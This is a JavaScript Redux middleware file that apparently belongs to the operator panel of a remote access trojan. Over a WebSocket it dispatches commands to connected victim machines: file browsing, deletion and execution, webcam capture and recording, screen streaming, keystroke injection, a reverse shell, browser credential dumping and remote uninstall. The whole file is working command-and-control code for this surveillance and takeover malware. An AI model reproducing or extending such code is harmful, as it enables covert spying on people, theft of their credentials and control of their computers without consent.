import {REQUEST_DISKS, REQUEST_DIRECTORY, COPY, MOVE, DELETE, RUN, DOWNLOAD} from "@redux/actions/fileManagerActions";
import {
    handleRequestDisks,
    handleCopy,
    handleMove,
    handleDelete,
    handleRun,
    handleRequestDirectory,
    handleDownload,
    handleStartWebcam,
    handleSelectClient,
    handleWebcamDevices,
    handleStopWebcam,
    handleStartRecording,
    handleStopRecording,
    handleSendWebcamRecords,
    handleStartStreaming,
    handleStopStreaming,
    handleMonitors,
    handleKey,
    handleStartReverseShell,
    handleSendCommandReverseShell,
    handleDumpBrowser,
    handleKeyboardController,
    handleMessageBox, handleSystemState, handleDisconnect, handleRestartConnection, handleUninstall
} from '@redux/middleware/actionHandlers';
import {handleWebSocketBinary, handleWebSocketMessage} from './messageHandler';
import {SELECT_CLIENT, WS_CONNECT} from "@redux/actions/connectionActions";
import {
    SEND_WEBCAM_RECORDS,
    START_RECORDING_WEBCAM,
    START_WEBCAM,
    STOP_RECORDING_WEBCAM,
    STOP_WEBCAM,
    WEBCAM_DEVICES
} from "@redux/actions/webcamManagerActions";
import {
    KEY_EXECUTION,
    MONITORS,
    START_SCREEN_STREAMING,
    STOP_SCREEN_STREAMING
} from "@redux/actions/screenManagerActions";
import {REVERSE_SHELL_COMMAND, START_REVERSE_SHELL} from "@redux/actions/reverseShellActions";
import {DUMP_BROWSER} from "@redux/actions/credentialsActions";
import {KEYBOARD_CONTROLLER} from "@redux/actions/keyboardControllerActions";
import {SHOW_MESSAGE_BOX} from "@redux/actions/messsageBoxActions";
import {DISCONNECT, RESTART, SYSTEM_STATE, UNINSTALL} from "@redux/actions/stateActions";

let websocket = null;

const actionHandlers = {
    [WS_CONNECT]: (store) => {
        websocket = new WebSocket( `${process.env.NEXT_PUBLIC_WS_URL}`);
        websocket.onmessage = (event) => {
            if (typeof event.data === "string")
                handleWebSocketMessage(store, JSON.parse(event.data));
            else if (event.data instanceof Blob)
                handleWebSocketBinary(store, event.data);
        };
    },
    [REQUEST_DISKS]: (store, action) => handleRequestDisks(websocket, store, action),
    [REQUEST_DIRECTORY]: (store, action) => handleRequestDirectory(websocket, store, action),
    [COPY]: (store, action) => handleCopy(websocket, store, action),
    [MOVE]: (store, action) => handleMove(websocket, store, action),
    [DELETE]: (store, action) => handleDelete(websocket, store, action),
    [RUN]: (store, action) => handleRun(websocket, store, action),
    [DOWNLOAD]: (store, action) => handleDownload(websocket, store, action),
    [SELECT_CLIENT]: (store, action) => handleSelectClient(websocket, store, action),
    [START_WEBCAM]: (store, action) => handleStartWebcam(websocket, store, action),
    [STOP_WEBCAM]: (store, action) => handleStopWebcam(websocket, store, action),
    [START_RECORDING_WEBCAM]: (store, action) => handleStartRecording(websocket, store, action),
    [STOP_RECORDING_WEBCAM]: (store, action) => handleStopRecording(websocket, store, action),
    [SEND_WEBCAM_RECORDS]: (store, action) => handleSendWebcamRecords(websocket, store, action),
    [WEBCAM_DEVICES]: (store, action) => handleWebcamDevices(websocket, store, action),
    [START_SCREEN_STREAMING]: (store, action) => handleStartStreaming(websocket, store, action),
    [STOP_SCREEN_STREAMING]: (store, action) => handleStopStreaming(websocket, store, action),
    [MONITORS]: (store, action) => handleMonitors(websocket, store, action),
    [KEY_EXECUTION]: (store, action) => handleKey(websocket, store, action),
    [START_REVERSE_SHELL]: (store, action) => handleStartReverseShell(websocket, store, action),
    [REVERSE_SHELL_COMMAND]: (store, action) => handleSendCommandReverseShell(websocket, store, action),
    [DUMP_BROWSER]: (store, action) => handleDumpBrowser(websocket, store, action),
    [KEYBOARD_CONTROLLER]: (store, action) => handleKeyboardController(websocket, store, action),
    [SHOW_MESSAGE_BOX]: (store, action) => handleMessageBox(websocket, store, action),
    [SYSTEM_STATE]: (store, action) => handleSystemState(websocket, store, action),
    [DISCONNECT]: (store, action) => handleDisconnect(websocket, store, action),
    [RESTART]: (store, action) => handleRestartConnection(websocket, store, action),
    [UNINSTALL]: (store, action) => handleUninstall(websocket, store, action),
};

const websocketMiddleware = store => next => action => {
    const handler = actionHandlers[action.type];
    if (handler) handler(store, action);
    return next(action);
};

export default websocketMiddleware;
